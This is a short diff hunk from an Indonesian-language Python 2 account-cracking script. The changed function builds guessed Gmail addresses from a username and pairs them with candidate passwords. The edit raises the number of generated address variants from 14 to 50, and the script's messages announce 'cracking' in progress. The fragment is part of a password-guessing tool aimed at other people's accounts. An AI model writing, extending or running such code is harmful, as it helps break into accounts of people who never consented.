@@ -49,7 +49,7 @@ def target():
 		print "\033[97;1m Masukkin Username Lol, Bukan Nama orangnya..\n Tapi gk pp lah, kamu masih bisa crack \n Walaupun Tidak Bertarget.."
 		print '\033[91;1m+'+'-'*38+'+'
 		gm = user.replace(' ', '')
-		for dev in range(1, 15):
+		for dev in range(1, 51):
 			user1.append(gm+str(dev)+'@gmail.com')
 		print "\n\033[92;1m Cracking Berjalan.......\n"
 		h_sandi = [sandi[0], sandi[1]]
